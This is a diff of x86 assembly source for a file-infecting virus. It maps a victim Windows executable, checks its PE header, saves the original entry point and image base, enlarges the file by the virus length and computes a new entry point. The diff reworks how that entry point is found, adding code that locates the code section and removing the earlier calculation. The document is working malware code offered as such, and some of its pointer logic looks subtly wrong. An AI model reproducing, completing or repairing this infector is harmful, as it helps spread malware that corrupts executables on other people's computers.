@@ -77,6 +77,7 @@ section .data
     oldRawSize          dd 0
     newRawSize          dd 0
     incRawSize          dd 0
+    codeSegment         dd 0
     
    
 section .text
@@ -194,7 +195,7 @@ InfectFile:
     add	  ecx, virusLen               ; ECX = victim filesize + virus
     add	  ecx, 1000h						; ECX = victim filesize + virus + 1000h
     mov     [memoryToMap], ecx          ; Memory to map
-    PRINT_TRACE
+    PRINT_TRACE ;1
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; save the original attributes                      ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -318,10 +319,10 @@ InfectFile:
     jmp	  UnmapView                       ; Error ?
  
 OkGo:
-    mov	  ebx, [esi + 3ch]                ; EBX = PE Header
+    mov	  ebx, [esi + 3ch]                ; EBX = PE Header RVA
     cmp	  word [esi + ebx], 0x4550 ;'EP'  ; Is it a PE file ?
     jne	  UnmapView                       ; Error ?
-    PRINT_TRACE
+    PRINT_TRACE ;2
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; If the file is not EXE, is already infected or is ;;
@@ -332,11 +333,29 @@ OkGo:
     mov	  [PEHeader], esi				; Save PE header
     mov	  eax, [esi + 28h]				 
     mov	  [oldEntryPoint], eax        ; Save Entry Point of file
-    mov	  eax, [esi + 34h]
+    mov	  eax, [esi + 34h]            ; Find the Image Base
     mov	  [imageBase], eax            ; Save the Image Base
     mov	  eax, [esi + 3ch]			
-    mov	  dword [fileAlign], eax	; Save File Alignment ; (EAX = File Alignment)
-    PRINT_TRACE
+    mov	  dword [fileAlign], eax	   ; Save File Alignment ; (EAX = File Alignment)
+    PRINT_TRACE ;3
+    
+    mov	  ebx, [esi + 74h]            ; Number of directories entries, PE + 0x74
+    shl	  ebx, 3							; * 8 (size of data directories)
+    add     ebx, 78h                    ; add size of COFF header
+    add     ebx, [PEHeader]             ; EAX = address of the .text section
+    mov     [codeSegment], ebx
+    PRINT_TRACE ;4
+    
+    PRINT_HEX [PEHeader]
+    
+    
+    mov     eax, [codeSegment + 12]     ; Reading code segment's RVA
+    PRINT_TRACE;5
+    mov     eax, [codeSegment + 8]      ; Add the size of the segment
+    PRINT_TRACE;6
+    mov     [newEntryPoint], eax			; EAX = new EIP, and save it
+    PRINT_TRACE;7
+
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Locate the last section in the PE                 ;;
@@ -392,7 +411,7 @@ OkGo:
     mov     ecx, [fileAlign]				; ECX = File alignment
     sub     ecx, edx						; Number of bytes to pad
     mov     [esi + 10h], ecx				; Save it
-    PRINT_TRACE
+    PRINT_TRACE ;5
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now size of raw data = number of bytes to pad     ;;
@@ -415,11 +434,17 @@ OkGo:
 ;; VirtualAddress + VirtualSize - VirusLength        ;;
 ;;      + RawSize = VirusStart                       ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    mov     eax, [esi + 12]             ; Get VirtualAddress
-    add     eax, [esi + 16d]				; Add VirtualSize, Rawsize
-    sub     eax, virusLen					; Subtract the size of virus
-    mov     [newEntryPoint], eax			; EAX = new EIP, and save it
-    PRINT_TRACE
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Here we compute with how much did we increase     ;;
